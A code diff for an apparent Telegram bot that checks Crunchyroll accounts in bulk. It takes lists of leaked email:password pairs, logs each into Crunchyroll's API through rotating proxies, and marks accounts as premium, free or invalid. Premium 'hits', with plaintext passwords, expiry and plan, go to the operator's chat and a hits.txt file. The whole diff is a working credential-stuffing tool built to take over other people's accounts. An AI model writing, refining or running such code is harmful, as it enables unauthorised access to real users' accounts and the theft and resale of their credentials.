@@ -21,6 +21,7 @@ checker = None
 proxies = []
 stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0}
 
+
 class CrunchyrollChecker:
     def __init__(self, proxies=None):
         self.proxies = proxies or []
@@ -37,7 +38,6 @@ class CrunchyrollChecker:
             if proxy := self._get_random_proxy():
                 session.proxies.update(proxy)
 
-            # === LOGIN ===
             data = {
                 'grant_type': 'password',
                 'username': email,
@@ -53,26 +53,21 @@ class CrunchyrollChecker:
                              data=data, timeout=15)
 
             if r.status_code != 200 or "access_token" not in r.text:
-                return {"status": "INVALID", "email": email, "reason": "Login failed"}
+                return {"status": "INVALID", "email": email}
 
             token = r.json().get("access_token")
             headers = {"authorization": f"Bearer {token}"}
 
-            # === ACCOUNT INFO ===
             me = session.get("https://beta-api.crunchyroll.com/accounts/v1/me", 
                            headers=headers, timeout=10).json()
 
             external_id = me.get("external_id")
-            if not external_id:
-                return {"status": "INVALID", "email": email, "reason": "No account ID"}
-
-            # === SUBSCRIPTION ===
             sub = session.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}", 
                             headers=headers, timeout=10).json()
 
             is_premium = sub.get("is_active", False) and not sub.get("is_cancelled", False)
 
-            result = {
+            return {
                 "status": "PREMIUM" if is_premium else "FREE",
                 "email": email,
                 "password": password,
@@ -81,37 +76,37 @@ class CrunchyrollChecker:
                 "country": sub.get("country_code", "Unknown"),
                 "plan": sub.get("tier", "Unknown")
             }
-            return result
 
         except Exception as e:
-            return {"status": "ERROR", "email": email, "reason": str(e)[:100]}
+            return {"status": "ERROR", "email": email, "reason": str(e)[:80]}
 
 
-async def send_result(chat_id, result):
+async def send_result(chat_id: int, result: dict):
     if result["status"] == "PREMIUM":
-        text = f"🎯 <b>PREMIUM HIT</b>\n<pre>" \
-               f"Email: {result['email']}\n" \
-               f"Pass : {result['password']}\n" \
-               f"Expiry: {result['expiry']}\n" \
-               f"Country: {result['country']}</pre>"
+        text = f"""🎯 <b>PREMIUM HIT</b>
+<pre>
+Email   : {result['email']}
+Pass    : {result['password']}
+Expiry  : {result['expiry']}
+Country : {result['country']}
+Plan    : {result['plan']}
+</pre>"""
         await bot.send_message(chat_id, text, parse_mode="HTML")
         
         with open("hits.txt", "a", encoding="utf-8") as f:
-            f.write(f"PREMIUM | {result['email']}:{result['password']} | {result['expiry']}\n")
+            f.write(f"PREMIUM | {result['email']}:{result['password']} | Expiry: {result['expiry']}\n")
 
     elif result["status"] == "FREE":
         await bot.send_message(chat_id, f"🆓 FREE → {result['email']}")
-    elif result["status"] == "INVALID":
-        await bot.send_message(chat_id, f"❌ INVALID → {result['email']}")
     else:
-        await bot.send_message(chat_id, f"⚠️ ERROR → {result['email']} | {result.get('reason','')}")
+        await bot.send_message(chat_id, f"❌ {result['status']} → {result['email']}")
 
 
-# ================== COMMANDS ==================
+# ================== HANDLERS ==================
 @dp.message(Command("start"))
 async def start(message: types.Message):
     if message.from_user.id not in AUTHORIZED_USERS: return
-    await message.answer("✅ Bot is ready.\nSend combos with /check")
+    await message.answer("✅ **Crunchyroll Checker is Online**\nSend your combos with /check")
 
 
 @dp.message(Command("stats"))
@@ -121,16 +116,16 @@ async def stats_cmd(message: types.Message):
 
 
 @dp.message(Command("hits"))
-async def hits(message: types.Message):
+async def hits_cmd(message: types.Message):
     if message.from_user.id not in AUTHORIZED_USERS or not os.path.exists("hits.txt"):
         return await message.answer("No hits yet.")
-    await message.answer_document(FSInputFile("hits.txt"))
+    await message.answer_document(FSInputFile("hits.txt"), caption="Premium Hits")
 
 
 @dp.message(F.document | F.text)
 async def handle(message: types.Message):
     if message.from_user.id not in AUTHORIZED_USERS:
-        return
+        return await message.answer("Unauthorized.")
 
     global checker
 
@@ -140,26 +135,26 @@ async def handle(message: types.Message):
     else:
         content = message.text.replace("/check", "").strip()
 
-    lines = [line.strip() for line in content.splitlines() if ":" in line]
+    lines = [line.strip() for line in content.splitlines() if ":" in line and "@" in line]
 
     if not lines:
         return await message.answer("No valid email:password found.")
 
     # Proxy loading
-    if "@" not in content[:200]:
+    if "@" not in "".join(lines[:3]):
         global proxies
         proxies = lines
         checker.proxies = proxies
-        return await message.answer(f"✅ {len(proxies)} proxies loaded.")
+        return await message.answer(f"✅ Loaded {len(proxies)} proxies.")
 
-    # Checking
-    await message.answer(f"🚀 Checking {len(lines)} combo(s)...")
+    # Start checking
+    await message.answer(f"🚀 Checking {len(lines)} combos...")
 
     for line in lines:
-        email, pwd = line.split(":", 1)
-        result = checker.check(email.strip(), pwd.strip())
-        
-        with lock := asyncio.Lock():  # simple protection
+        try:
+            email, password = line.split(":", 1)
+            result = checker.check(email.strip(), password.strip())
+            
             stats['checked'] += 1
             if result["status"] == "PREMIUM":
                 stats['premium'] += 1
@@ -168,13 +163,15 @@ async def handle(message: types.Message):
             else:
                 stats['invalid'] += 1
 
-        await send_result(message.from_user.id, result)
+            await send_result(message.from_user.id, result)
+        except:
+            continue
 
 
 async def main():
     global checker
     checker = CrunchyrollChecker(proxies)
-    print("Bot Started Successfully!")
+    print("✅ Bot Started Successfully!")
     await dp.start_polling(bot)
 
 
